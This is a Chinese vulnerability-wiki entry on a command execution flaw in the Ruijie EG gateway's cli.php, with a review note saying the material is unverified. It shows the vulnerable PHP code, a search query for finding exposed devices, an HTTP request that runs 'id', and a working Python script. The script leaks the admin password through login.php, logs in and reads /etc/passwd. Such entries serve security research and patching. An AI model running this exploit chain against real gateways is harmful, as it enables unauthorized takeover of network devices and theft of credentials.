---
version: "锐捷EG易网关"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-9cdcb03323c38d02d1a8164b"
entity_id: "ve-9cdcb03323c38d02d1a8164b"
schema_version: "1"
title: "锐捷 EG易网关 cli.php 远程命令执行漏洞"
product: "Ruijie EG易网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "后台权限，或组合泄露获得凭据；未列固件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7-EG%E6%98%93%E7%BD%91%E5%85%B3-cli.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
---

# 锐捷 EG易网关 cli.php 远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie EG易网关
- 本文讨论：cli.php shellAction任意程序调用，前置login.php密码泄露
- 版本、权限与配置前提：后台权限，或组合泄露获得凭据；未列固件
- 资料类型：源码/链式PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- EscapeShellCmd确有调用；问题是允许控制整个命令，不应称完全没有过滤或依赖分隔符绕过
- 需明确管理员Shell是预期功能还是越权边界，父控制器鉴权未展示
- 脚本登录成功子串/headers正则及未编码密码有误判风险
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 功能权限设计、固件范围与认证层待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

锐捷EG易网关 cli.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器

## 漏洞影响

```
锐捷EG易网关
```

## 网络测绘

```
app="Ruijie-EG易网关"
```

## 漏洞复现

首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)

漏洞文件 cli.php

```php
<?php

/**
 * cli命令查询
 */
define('IN', true);     //定位该文件是入口文件
define('DS', DIRECTORY_SEPARATOR);
define('AROOT', dirname(__FILE__) . DS);
include_once(AROOT . 'mvc' . DS . 'controller' . DS . 'core.controller.php');

class defaultController extends coreController {

    function __construct() {
// 载入默认的
        parent::__construct();
    }

    /**
     * cli命令执行
     */
    public function indexAction() {
        $mode = p("mode_url");
        $command = p("command");
        $answer = p("answer");

        if ($mode == false)
            $mode = "exec";
        if ($answer == false)
            $answer = "";
        if ($command !== false)
            $command = iconv('UTF-8', 'GBK//IGNORE', $command);
        $data = execCli($mode, $command, $answer);
        if ($data["status"] !== 1) {
            json_echo($data);
            exit();
        }
        $res = preg_replace(array("/%01/", "/%22/", "/%09/", "/%0D/", "/%3A/","/%07/"), array("", '"', "\t", "", ":",""), urlencode($data["data"])); //先进行url编码防止gbk中文无法json,再过滤首尾空方块
        $resArr = explode("%0A", $res);
        //$resArr = preg_split("/\r\n|\n/", $data["data"]);
        if ($mode == "config" && strstr($resArr[0], "Enter+configuration+commands%2C+one+per+line.++End+with+CNTL%2FZ."))
            array_shift($resArr);
        $data["data"] = $resArr;
        if (!headers_sent()) {
            header("Content-type: text/json;charset=gbk");
            //header("Expires: Thu, 01 Jan 1970 00:00:01 GMT");
            header("Cache-Control: no-cache, must-revalidate");
            header("Pragma: no-cache");
        }
        echo urldecode(json_encode($data));
        //echo json_encode($data);
    }

    /**
     * 执行shell脚本
     */
    public function shellAction() {
        $command = p("command");
        if ($command == false) {
            $data["status"] = 2;
            $data["msg"] = "no command";
            json_echo($data);
            exit();
        }
        $content = [];
        exec(EscapeShellCmd($command), $content);
        $data = array("status" => true,
            "data" => $content);
        json_echo($data);
    }

    /**
     * 获取系统时间
     */
    public function dateAction() {
        setTimeZone();
        $data['status'] = true;
        $data["data"]["time"] = date("Y-m-d H:i:s");
        $data["data"]["zone"] = "UTC" . getTimeZone();
        json_echo($data);
    }

    /**
     * 获取系统时区
     */
    public function datezoneAction() {
        $data['status'] = true;
        $data["data"] = getTimeZone();
        json_echo($data);
    }

    /**
     * 检测静态页面时候未登录直接进入
     */
    public function checkloginAction() {
        json_echo(array("status" => true));
    }

}

include_once(AROOT . "init.php");     //mvc初始化入口，放在底部
```

关键部分代码为

```php
/**
     * 执行shell脚本
     */
    public function shellAction() {
        $command = p("command");
        if ($command == false) {
            $data["status"] = 2;
            $data["msg"] = "no command";
            json_echo($data);
            exit();
        }
        $content = [];
        exec(EscapeShellCmd($command), $content);
        $data = array("status" => true,
            "data" => $content);
        json_echo($data);
    }
```

command参数直接传入执行了命令

发送请求包

```http
POST /cli.php?a=shell HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=nk5erth9i0pvcco3n7fbpa9bi0;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

notdelay=true&command=id
```

![](./.resource/锐捷-EG易网关-cli.php-远程命令执行漏洞/media/202202110929756.png)


## 漏洞POC

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 锐捷EG网关 cli.php RCE                                      \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password=admin?show+webmaster+user'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(target_url))
        if "data" in response.text and response.status_code == 200:
            password = re.findall(r'admin (.*?)"', response.text)[0]
            print("\033[36m[o] 成功获取, 账号密码为:  admin   {} \033[0m".format(password))
            POC_2(target_url, password)
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_2(target_url, password):
    vuln_url = target_url + "/login.php"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'username=admin&password={}'.format(password)
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在登录..... \033[0m".format(target_url))
        if "status" in response.text and "1" in response.text and response.status_code == 200:
            ruijie_cookie = "RUIJIEID=" + re.findall(r"'Set-Cookie': 'RUIJIEID=(.*?);", str(response.headers))[0] + ";user=admin;"
            print("\033[36m[o] 成功获取管理员Cookie: {} \033[0m".format(ruijie_cookie))
            POC_3(target_url, ruijie_cookie)

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

def POC_3(target_url, ruijie_cookie):
    vuln_url = target_url + "/cli.php?a=shell"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "{}".format(ruijie_cookie)
    }
    data = 'notdelay=true&command=cat /etc/passwd'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 cat /etc/passwd..... \033[0m".format(target_url))
        if "root:" in response.text and response.status_code == 200:
            print("\033[36m[o] 成功读取 /etc/passwd \n[o] 响应为:{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```


![](./.resource/锐捷-EG易网关-cli.php-远程命令执行漏洞/media/202202110929316.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
